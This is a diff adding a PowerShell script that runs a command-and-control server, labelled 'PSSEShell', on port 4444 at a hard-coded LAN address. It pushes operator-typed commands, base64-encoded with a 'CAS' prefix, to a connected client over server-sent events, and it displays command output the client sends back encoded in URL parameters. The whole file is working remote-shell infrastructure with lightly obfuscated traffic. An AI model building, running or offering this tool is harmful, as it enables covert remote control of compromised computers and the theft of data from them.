@@ -1,0 +1,93 @@
+#[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$port = 4444
+$listener = New-Object System.Net.HttpListener
+#소스코드 세팅
+$listener.Prefixes.Add("http://192.168.0.184:4444/") 
+$listener.Start()
+
+Write-Host "SSE server running at http://192.168.0.184:$port/stream" -ForegroundColor Green
+Write-Host "Stop with: iwr http://192.168.0.184:$port/shutdown" -ForegroundColor Green
+
+$Shutdown = $false
+$NextCommand = $null
+$SSEWriter = $null
+
+while (-not $Shutdown) {
+    if ($SSEWriter -and -not $NextCommand) {
+        $NextCommand = Read-Host '( PSSEShell )>>'
+		$bytes = [System.Text.Encoding]::UTF8.GetBytes($NextCommand)
+		$NextCommand = [System.Convert]::ToBase64String($bytes)
+		$NextCommand = 'CAS'+$NextCommand
+    }
+
+    if ($NextCommand -and $SSEWriter -and $SSEWriter.BaseStream.CanWrite) {
+        $SSEWriter.Write("data: $NextCommand`n`n")
+        $SSEWriter.Close()
+		$SSEWriter = $null
+        $NextCommand = $null
+    }
+
+    # Block until request comes in
+    $context = $listener.GetContext()
+    $request = $context.Request
+    $response = $context.Response
+
+    switch ($request.Url.AbsolutePath) {
+        "/stream" {
+            $response.StatusCode = 200
+            $response.ContentType = "text/event-stream"
+            $response.Headers.Add("Cache-Control", "no-cache")
+            $response.Headers.Add("Connection", "keep-alive")
+
+            $SSEWriter = New-Object System.IO.StreamWriter($response.OutputStream)
+            Write-Host "[+] Client connected to /stream"
+
+            # Don't close keep it open
+            continue
+        }
+
+        "/post" {
+            $rawUrl = $request.RawUrl
+
+			$Parameters = @{}
+			$rawUrl = $rawUrl.Split("?")
+			$Path = $rawUrl[0]
+			$rawParameters = $rawUrl[1]
+			$output = $null
+			if ($rawParameters) {
+				foreach ($rawParameter in $rawParameters) {
+					$Parameter = $rawParameter.Split("=")
+					$output = $Parameter[1]
+					$length = ($output.Length - 3) % 4
+					if($length -eq 2){
+						$output = $output + "=="
+					}
+					if($length -eq 3){
+						$output = $output + "="
+					}
+					
+				}
+			}
+	
+			$output = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($output.Substring(3)))
+
+            if (-not [string]::IsNullOrWhiteSpace($output)) {
+                Write-Host "`n[Client Output] >>" -ForegroundColor Yellow
+                Write-Host $output -ForegroundColor Cyan
+            } else {
+                Write-Warning "Received empty result payload."
+            }
+
+            $response.StatusCode = 200
+            $response.Close()
+            continue
+        }
+
+        default {
+            $response.StatusCode = 404
+            $response.Close()
+        }
+    }
+
+    Start-Sleep -Milliseconds 100
+}
